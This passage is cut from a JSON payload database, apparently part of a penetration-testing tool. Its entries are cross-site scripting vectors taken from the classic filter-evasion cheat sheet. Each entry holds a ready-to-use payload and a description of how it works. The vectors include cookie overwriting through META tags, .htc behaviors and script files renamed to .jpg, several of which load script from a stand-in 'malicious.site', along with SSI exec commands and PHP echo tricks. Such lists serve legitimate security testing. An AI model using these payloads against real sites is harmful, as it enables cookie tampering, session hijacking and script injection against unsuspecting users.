        "pType": "XSS",
        "pCategory": "Other",
        "payload": "<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=<SCRIPT>alert('mth3l3m3nt')<\/SCRIPT>\">",
        "pDescription": "<p>Cookie manipulation - admittedly this is pretty obscure but I have seen a few examples where &lt;META is allowed and you can user it to overwrite cookies. There are other examples of sites where instead of fetching the username from a database it is stored inside of a cookie to be displayed only to the user who visits the page.<\/p>\r\n\r\n<p>With these two scenarios combined you can modify the victim&#39;s cookie which will be displayed back to them as JavaScript (you can also use this to log people out or change their user states, get them to log in as you, etc).<\/p>\r\n\r\n<p><em><strong>Browser Support: &nbsp;[IE7.0][IE6.0][NS8.1-IE][NS8.1-G][FF2.0][O9.02]<\/strong><\/em><\/p>\r\n"
    },
    "564b472ecf5b42.88458841": {
        "pName": "Local .htc file",
        "pType": "XSS",
        "pCategory": "Other",
        "payload": "<XSS STYLE=\"behavior: url(http:\/\/malicious.site\/xss.htc);\">",
        "pDescription": "<p>This uses an .htc file which must be on the same server as the XSS vector. The example file works by pulling in the JavaScript and running it as part of the style attribute.<\/p>\r\n\r\n<p><em><strong>Browser Support: [IE7.0][IE6.0][NS8.1-IE]<\/strong><\/em><\/p>\r\n"
    },
    "564b4767639ce4.25388111": {
        "pName": "rename .js to .jpg",
        "pType": "XSS",
        "pCategory": "Other",
        "payload": "<SCRIPT SRC=\"http:\/\/malicious.site\/xss.jpg\"><\/SCRIPT>",
        "pDescription": "<p>Assuming you can only fit in a few characters and it filters against &quot;.js&quot; you can rename your JavaScript file to an image as an XSS vector.<\/p>\r\n\r\n<p><em><strong>Browser Support: [IE7.0][IE6.0][NS8.1-IE][NS8.1-G][FF2.0][O9.02]<\/strong><\/em><\/p>\r\n"
    },
    "564b4794920ec0.57406677": {
        "pName": "SSI",
        "pType": "XSS",
        "pCategory": "Other",
        "payload": "<!--#exec cmd=\"\/bin\/echo '<SCRIPT SRC'\"--><!--#exec cmd=\"\/bin\/echo '=http:\/\/malicious.site\/xss.js><\/SCRIPT>'\"-->",
        "pDescription": "<p>SSI (Server Side Includes) requires SSI to be installed on the server to use this XSS vector.&nbsp; I probably don&#39;t need to mention this, but if you can run commands on the server there are no doubt much more serious issues.<\/p>\r\n\r\n<p><em><strong>Browser Support: [IE7.0][IE6.0][NS8.1-IE][NS8.1-G][FF2.0][O9.02]<\/strong><\/em><\/p>\r\n"
    },
    "564b47b8558549.54681095": {
        "pName": "PHP",
        "pType": "XSS",
        "pCategory": "Other",
        "payload": "<? echo('<SCR)'; echo('IPT>alert(\"mth3l3m3nt\")<\/SCRIPT>'); ?>",
        "pDescription": "<p>PHP - requires PHP to be installed on the server to use this XSS vector. Again, if you can run any scripts remotely like this, there are probably much more dire issues.<\/p>\r\n\r\n<p><em><strong>Browser Support: &nbsp;[IE7.0][IE6.0][NS8.1-IE][NS8.1-G][FF2.0][O9.02]<\/strong><\/em><\/p>\r\n"
    },
    "564b47d8a774a7.23137865": {
        "pName": "javascript includes",
        "pType": "XSS",
        "pCategory": "Other",
        "payload": "<BR SIZE=\"&{alert('mth3l3m3nt')}\">",
        "pDescription": "<p>&amp;JavaScript includes (works in Netscape 4.x).<\/p>\r\n"
    }
}